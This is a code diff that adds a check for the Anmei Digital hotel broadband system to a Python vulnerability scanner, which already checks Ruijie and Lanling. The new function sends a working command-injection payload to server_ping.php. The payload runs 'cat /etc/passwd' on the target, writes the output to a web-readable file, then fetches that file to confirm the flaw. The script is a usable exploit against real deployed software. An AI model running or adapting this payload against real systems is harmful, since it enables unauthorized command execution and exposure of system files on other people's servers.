@@ -33,10 +33,29 @@ def ruijie(url):
             print("\033[1;31m不存在漏洞\033[0m")
     except Exception as e:
         print("\033[1;31m不存在漏洞\033[0m",format(e))
-
+def anmei(url):
+    first=url+"/manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../cmd.txt&id=1"
+    header={
+    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
+    "Content-Type":"application/x-www-form-urlencoded"
+        }
+    try:
+        response=requests.get(url=first,headers=header,verify=False)
+        print("\033[1;36m安美数字发送payload中...\033[0m") 
+        if 'doTestResult' in response.text:
+            second=url+"/cmd.txt"
+            response=requests.get(url=second,headers=header,verify=False)
+            print("\033[1;36m安美数字酒店宽带运营系统漏洞扫描中...\033[0m")
+            if 'root' in response.text:
+                print("\033[1;32m存在漏洞\033[0m")
+            else:
+                print("\033[1;31m不存在漏洞\033[0m")
+    except Exception as e:
+        print("\033[1;31m不存在漏洞\033[0m",format(e))
 if __name__=='__main__':
     url= sys.argv[1]
     ruijie(url)
     lanling(url)
+    anmei(url)
     
 
